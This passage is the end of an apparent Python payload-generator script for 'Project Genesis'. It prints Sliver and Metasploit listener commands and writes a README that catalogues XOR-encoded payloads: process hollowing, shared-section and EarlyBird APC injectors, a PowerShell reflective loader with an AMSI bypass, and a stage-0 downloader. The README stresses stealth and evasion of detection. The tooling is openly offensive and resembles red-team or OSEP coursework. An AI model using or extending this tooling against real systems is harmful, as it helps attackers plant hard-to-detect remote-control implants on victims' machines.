    for c in sli_x64: console.print(f"     [white]{c}[/white]")
    console.print(f"\n   [yellow]x86 Assets:[/yellow] [white]sliver_xor.x86.bin[/white]")
    console.print(f"   [yellow]x86 Setup:[/yellow]")
    for c in sli_x86: console.print(f"     [white]{c}[/white]")

    # Generate README.md
    readme = f"# 🛡️ Project Genesis Infrastructure - {lhost}\n\n"
    readme += f"**XOR Key Used**: `{hex(key)}`\n\n"
    readme += "## 📂 Generated Assets\n\n| Filename | Type | Arch | Port | Execution Command |\n|---|---|---|---|---|\n"
    for p in payloads_info:
        readme += f"| `{p['name']}` | {p['type']} | {p['arch']} | {p['port']} | `{p['cmd']}` |\n"
    
    readme += f"\n## 🎧 Listener Guide\n\n### 1. Metasploit\n"
    readme += "* **x64** (Assets: `hollowing.exe`, `injector.exe`, `earlybird.exe`, `hollybird.exe`, `stage_*.ps1`, `met_advanced_loader.txt`):\n"
    readme += f"  * `sudo msfconsole -q -x \"{msf_64}\"`\n\n"
    readme += "* **x86** (Assets: `met_xor.x86.bin`):\n"
    readme += f"  * `sudo msfconsole -q -x \"{msf_86}\"`\n\n"
    
    readme += "### 2. Sliver\n"
    readme += "* **x64** (Assets: `sliver_xor.x64.bin`, `advanced_loader.txt`, `payload.ps1`):\n"
    readme += "\n".join([f"  * `{c}`" for c in sli_x64]) + "\n\n"
    readme += "* **x86** (Assets: `sliver_xor.x86.bin`):\n"
    readme += "\n".join([f"  * `{c}`" for c in sli_x86]) + "\n\n"
    readme += "## 📖 Explanations\n\n* **Dynamic Loader (Hollowing)**: Spawns suspended process and replaces entry point. Classic OSEP technique.\n"
    readme += "* **Memory Migrator (Sections)**: Shared memory injection into an existing process (explorer.exe).\n"
    readme += "* **EarlyBird Runner (APC)**: APC injection into a new suspended process. Bypasses some startup hooks.\n"
    readme += "* **HollyBird Phantom (Sections+APC)**: The ultimate stealth approach. Uses Shared Section mapping (no WriteProcessMemory) and APC triggering (no entry point patching). Extremely hard to detect.\n"
    readme += "* **Reflective Loader (.txt)**: In-memory AMSI bypass + Reflective injection via PowerShell.\n"
    readme += "* **XOR Stager (.ps1)**: Lightweight stage-0 downloader and executor."
    
    with open(os.path.join(target_dir, "README.md"), "w") as f: f.write(readme)

    # Terminal Explanations
    console.print(f"\n[bold cyan]3. Payload Explanations[/bold cyan]")
    console.print(f"   [magenta]Dynamic Loader:[/magenta] [white]Process Hollowing technique.[/white]")
    console.print(f"   [magenta]Memory Migrator:[/magenta] [white]Shared Memory injection.[/white]")
    console.print(f"   [magenta]EarlyBird Runner:[/magenta] [white]APC Injection technique.[/white]")
    console.print(f"   [magenta]HollyBird Phantom:[/magenta] [white]Combined Sections + APC technique. Stealthiest option.[/white]")
    console.print(f"   [magenta]Reflective Loader:[/magenta] [white]In-memory AMSI bypass + Reflective injection.[/white]")
    console.print(f"   [magenta]XOR Stager:[/magenta] [white]Lightweight stage-0 downloader.[/white]")

if __name__ == "__main__": main()
